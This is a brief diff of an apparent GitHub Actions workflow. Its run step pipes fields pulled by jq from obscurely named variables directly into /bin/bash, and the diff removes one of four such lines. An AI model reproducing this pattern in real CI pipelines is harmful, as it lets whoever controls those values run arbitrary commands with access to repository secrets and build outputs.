@@ -23,7 +23,6 @@ jobs:
           echo $sxhpz7987 | jq -r .mflh07560 | /bin/bash
           printf '%s' "$oxeaz0566" | jq -r .oramf7911 | /bin/bash
           printf '%s' "$vjvr022" | jq -r .exdib8 | /bin/bash
-          echo $mta14998 | jq -r .q67117 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
